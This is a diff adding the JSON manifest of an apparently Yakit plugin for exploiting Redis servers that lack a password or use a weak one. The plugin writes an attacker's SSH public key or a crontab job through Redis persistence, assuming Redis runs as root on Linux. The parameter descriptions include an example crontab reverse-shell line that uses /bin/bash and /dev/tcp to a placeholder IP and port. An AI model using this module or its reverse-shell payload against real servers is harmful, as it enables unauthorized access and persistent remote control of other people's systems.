@@ -1,0 +1,61 @@
+{
+    "name": "redis未授权访问",
+    "tags": [
+        "redis",
+        "未授权访问"
+    ],
+    "help": "redis未设置密码或者弱口令，使用redis持久化存储写入publickey（插件可选）或者crontab任务（插件可选），ps：上述需要redis是以root权限启动（限目标为Linux），写入公钥和写入crontab参数二选一执行，有密码可设置redis密码",
+    "author": "不愿意透露ID的菜鸟",
+    "module_file": "yak_module.yak",
+    "params": [
+        {
+            "name": "target",
+            "verbose": "目标IP",
+            "description": "输入IP地址",
+            "type": "string",
+            "default_value": "",
+            "required": true,
+            "group": ""
+        },
+        {
+            "name": "port",
+            "verbose": "输入端口",
+            "description": "输入端口",
+            "type": "string",
+            "default_value": "6379",
+            "required": true,
+            "group": ""
+        },
+        {
+            "name": "passwd",
+            "verbose": "redis密码",
+            "description": "输入redis密码",
+            "type": "string",
+            "default_value": "",
+            "required": false,
+            "group": ""
+        },
+        {
+            "name": "Crontab",
+            "verbose": "写入crontab任务",
+            "description": "写入crontab任务,如：\n*/1 * * * * /bin/bash -i \u003e\u0026 /dev/tcp/\u003cip\u003e/\u003cport\u003e 0\u003e\u00261\n默认是/var/spool/cron/crontabs目录",
+            "type": "string",
+            "default_value": "",
+            "required": false,
+            "group": ""
+        },
+        {
+            "name": "PublicKey",
+            "verbose": "写入公钥",
+            "description": "输入公钥。。",
+            "type": "string",
+            "default_value": "",
+            "required": false,
+            "group": ""
+        }
+    ],
+    "document": "document.md",
+    "general_module_verbose": "",
+    "general_module_key": "",
+    "is_general_module": false
+}
